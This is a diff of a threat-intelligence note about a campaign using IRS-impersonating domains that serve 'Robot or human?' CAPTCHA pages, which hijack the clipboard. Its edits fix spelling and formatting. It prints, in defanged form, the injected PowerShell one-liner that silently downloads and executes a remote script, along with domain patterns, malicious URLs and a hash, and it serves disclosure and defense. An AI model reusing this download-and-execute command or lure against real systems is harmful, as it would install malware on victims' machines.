@@ -1,4 +1,4 @@
-2025-04-15 (TUESDAY): IRS-THEMED DOMAINS USED FOR CAPTCHA STYLE PASTE HIJACKING PAGES
+2025-04-15 (TUESDAY): IRS-THEMED DOMAINS USED FOR CAPTCHA-STYLE PASTE HIJACKING PAGES
 
 AUTHORS:
 
@@ -7,8 +7,8 @@ AUTHORS:
 NOTES:
 
 - Our telemetry reveals a malicious campaign that uses domains impersonating the United States IRS.
-- The associated sites returned a "Robot or human?" CAPTCHA style page that performs paste hijacking. 
-- These type of pages attempt to convince viewers to past malicious script into a run window.
+- The associated sites returned a "Robot or human?" CAPTCHA-style page that performs paste hijacking. 
+- These pages attempt to convince viewers to paste malicious script into a run window.
 - The domains use the following two patterns for their fully qualified domain names (FQDNs): 
  -- irs.gov-[a-z0-9]*.<tld>
  -- irs.[a-z]*.gov-[a-z0-9]*.<tld>
@@ -62,9 +62,9 @@ TWO EXAMPLES OF HTML PAGES FROM THE MALICIOUS WEB SITES AND ASSOCIATED SCRIPT IN
 - Returned from: hxxps[:]//irs.gov-tax[.]cfd/?mt_click_id=mt-x9qfi4-1740022510-220448231
 - Script injected into Paste buffer:
    
-   powershell -nop -w h -c "[Net.ServicePointManager]::SecurityProtocol=3072;start 
-   'hxxps[:]//azure.microsoft[.]com';iex((iwr 
-   'hxxps[:]//doordash[.]gifts/catalog3/verify.ps1' -UseBasicParsing) 2>$null)"
+  powershell -nop -w h -c "[Net.ServicePointManager]::SecurityProtocol=3072;start 
+  'hxxps[:]//azure.microsoft[.]com';iex((iwr 
+  'hxxps[:]//doordash[.]gifts/catalog3/verify.ps1' -UseBasicParsing) 2>$null)"
 
 - SHA256 hash: 7ec7b41bba47f175c666eb359f31d383feb7162f1b977df4340d5df5abe042e9
 - Returned from: hxxps[:]//irs.org.gov-tax[.]icu/
